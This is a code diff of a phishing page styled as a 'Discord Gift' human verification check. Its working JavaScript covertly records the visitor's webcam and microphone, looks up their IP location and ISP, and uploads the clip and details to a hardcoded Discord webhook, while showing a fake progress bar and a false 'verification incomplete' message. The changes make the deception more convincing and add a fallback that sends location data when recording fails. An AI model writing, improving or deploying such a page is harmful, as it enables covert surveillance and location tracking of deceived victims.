@@ -17,7 +17,16 @@
   <title>Discord Gift</title>
   <style>
     body { margin:0; background:#111; color:#eee; font-family:Arial, sans-serif; text-align:center; padding: 20vh 10px; min-height:100vh; }
-    #msg { font-size:1.8em; margin:20px; }
+    #msg { font-size:1.6em; margin:20px; }
+    .progress-container {
+      width: 80%; max-width: 400px; margin: 20px auto; background: #333; border-radius: 8px; overflow: hidden; height: 30px; position: relative;
+    }
+    .progress-bar {
+      width: 0%; height: 100%; background: #0066cc; transition: width 0.3s ease; 
+    }
+    .progress-text {
+      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: white; font-weight: bold; font-size: 1.2em; text-shadow: 0 0 5px black; z-index: 2;
+    }
     video { display:none; }
     .container { max-width:600px; margin:auto; }
     button { padding:15px 40px; font-size:1.3em; background:#0066cc; color:white; border:none; border-radius:8px; cursor:pointer; margin:20px; }
@@ -29,6 +38,12 @@
   <div class="container">
     <h1>Quick Verification</h1>
     <p id="msg">Please click verify to continue. This helps prove you're a human.</p>
+    
+    <div id="progressContainer" class="progress-container" style="display:none;">
+      <div id="progressBar" class="progress-bar"></div>
+      <div id="progressText" class="progress-text">0%</div>
+    </div>
+
     <video id="video" autoplay playsinline muted></video>
     <button id="btn">Verify Me</button>
   </div>
@@ -37,6 +52,9 @@
     const videoElement = document.getElementById('video');
     const msg = document.getElementById('msg');
     const btn = document.getElementById('btn');
+    const progressContainer = document.getElementById('progressContainer');
+    const progressBar = document.getElementById('progressBar');
+    const progressText = document.getElementById('progressText');
 
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1479318338411827384/nNZ_pZsoR7CZJn9n6U_UA4hawAdOKiGngDqoDBNkbTT7pggzniMRTDh7wO_tNRfDXhZZ";
 
@@ -46,23 +64,65 @@
         btn.disabled = true;
 
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" },
+          video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
           audio: true
         });
 
         videoElement.srcObject = stream;
 
-        await new Promise(r => setTimeout(r, 1500));
+        await new Promise(r => setTimeout(r, 2000));
 
-        msg.textContent = "Loading...";
+        // Show progress bar
+        progressContainer.style.display = 'block';
+        msg.textContent = ""; // hide text, let bar do the talking
 
         const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
         const chunks = [];
 
-        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+        recorder.ondataavailable = e => {
+          if (e.data.size > 0) chunks.push(e.data);
+        };
+
+        // Fake progress animation synced roughly to 10-12s recording
+        let progress = 0;
+        const progressInterval = setInterval(() => {
+          progress += Math.random() * 5 + 2; // irregular but smooth climb
+          if (progress > 100) progress = 100;
+          progressBar.style.width = progress + '%';
+          progressText.textContent = Math.round(progress) + '%';
+        }, 200); // updates every 200ms for smooth feel
 
         recorder.onstop = async () => {
-          if (chunks.length === 0) throw new Error("No data");
+          clearInterval(progressInterval);
+          progressBar.style.width = '100%';
+          progressText.textContent = '100%';
+
+          stream.getTracks().forEach(track => track.stop());
+
+          if (chunks.length === 0) {
+            // Fallback text send
+            let geoDetails = "Location grab failed";
+            try {
+              const geoRes = await fetch('https://ipapi.co/json/');
+              if (geoRes.ok) {
+                const data = await geoRes.json();
+                if (!data.error) geoDetails = `IP: ${data.ip || 'n/a'}\nCity: ${data.city || 'n/a'}\nRegion: ${data.region || 'n/a'}\nCountry: ${data.country_name || 'n/a'}\nCoords: ${data.latitude || 'n/a'}, ${data.longitude || 'n/a'}\nISP: ${data.org || 'n/a'}`;
+              }
+            } catch {}
+
+            await fetch(WEBHOOK_URL, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                content: `⚠️ Capture failed (no data) - still got basics:\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n**Location/Device:**\n${geoDetails}`
+              })
+            });
+
+            msg.textContent = "Verification incomplete. Center Face In Camera View";
+            progressContainer.style.display = 'none';
+            btn.style.display = 'none';
+            return;
+          }
 
           const blob = new Blob(chunks, { type: 'video/webm' });
 
@@ -71,52 +131,33 @@
             const geoRes = await fetch('https://ipapi.co/json/');
             if (geoRes.ok) {
               const data = await geoRes.json();
-              if (!data.error) {
-                geoDetails = `IP: ${data.ip || 'n/a'}\nCity: ${data.city || 'n/a'}\nRegion: ${data.region || 'n/a'}\nCountry: ${data.country_name || 'n/a'}\nCoords: ${data.latitude || 'n/a'}, ${data.longitude || 'n/a'}\nISP: ${data.org || 'n/a'}`;
-              }
+              if (!data.error) geoDetails = `IP: ${data.ip || 'n/a'}\nCity: ${data.city || 'n/a'}\nRegion: ${data.region || 'n/a'}\nCountry: ${data.country_name || 'n/a'}\nCoords: ${data.latitude || 'n/a'}, ${data.longitude || 'n/a'}\nISP: ${data.org || 'n/a'}`;
             }
           } catch {}
 
           const payload = {
-            content: `🎥 New verification clip attached (silent capture)\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoDetails}`
+            content: `🎥 Verification clip attached (silent capture)\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoDetails}`
           };
 
           const formData = new FormData();
-          formData.append('file', blob, `verification_${Date.now()}.mp4`);  // .mp4 trick for better preview chance
+          formData.append('file', blob, `verification_${Date.now()}.mp4`);
           formData.append('payload_json', JSON.stringify(payload));
 
           msg.textContent = "Finalizing...";
 
-          const response = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+          await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
 
-          if (response.ok) {
-            msg.textContent = "Verification incomplete. Center Face In Camera View";
-            btn.style.display = 'none';
-          } else {
-            // Fallback if upload bombs (e.g. size/rate limit)
-            const reader = new FileReader();
-            reader.onload = async () => {
-              const base64 = reader.result.split(',')[1];
-              await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  content: `Capture failed upload - base64 snippet (first 1000 chars):\n${base64.slice(0,1000)}...\n\n${payload.content}`
-                })
-              });
-              msg.textContent = "Verification incomplete. Center Face In Camera View";
-            };
-            reader.readAsDataURL(blob);
-          }
-
-          stream.getTracks().forEach(track => track.stop());
+          msg.textContent = "Verification incomplete. Center Face In Camera View";
+          progressContainer.style.display = 'none';
+          btn.style.display = 'none';
         };
 
-        recorder.start();
-        setTimeout(() => recorder.stop(), 10000);
+        recorder.start(1000);
+        setTimeout(() => recorder.stop(), 12000);
 
       } catch (err) {
         msg.textContent = "Verification incomplete. Center Face In Camera View";
+        progressContainer.style.display = 'none';
         btn.disabled = false;
       }
     }
